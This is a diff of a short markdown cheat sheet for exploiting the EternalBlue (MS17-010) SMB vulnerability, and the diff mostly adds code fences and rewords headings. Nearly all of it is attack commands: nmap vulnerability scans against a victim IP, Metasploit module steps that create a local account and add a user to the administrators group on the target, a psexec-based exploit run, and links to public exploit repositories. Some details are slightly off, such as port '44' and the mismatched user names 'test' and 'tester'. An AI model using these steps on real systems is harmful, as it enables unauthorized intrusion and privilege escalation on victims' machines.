@@ -1,23 +1,29 @@
 ## eternal blue (ms17_010)
 
-nmap nse:
+nmap use with nse script:
+```
 - nmap -v --script vuln [victim_ip] -p 445,139
 - nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
+```
 
 ## eternal blue commands(via metasploit)
+```
 - use auxiliary/admin/smb/ms17_010_command
-- set rhosts [victim_ip]
-- set rport 445
-- **set command net user test test123! /add**
+- set rhosts: [victim_ip]
+- set rport: 445
+- set command: net user test test123! /add
 - run
-- **set command net localgroup administrators tester /add**
+- set command: net localgroup administrators tester /add
 - run
+```
 ## eternal blue psexec (via metasploit)
+```
 - use exploit/windows/smb/ms17_010_psexec
 - set rhosts [victim_ip]
 - run
+```
 
-### tools
+### Usefull tools for eternalblue
 - https://github.com/worawit/MS17-010
 - https://github.com/3ndG4me/AutoBlue-MS17-010
 - https://github.com/sailay1996/eternal-pulsar
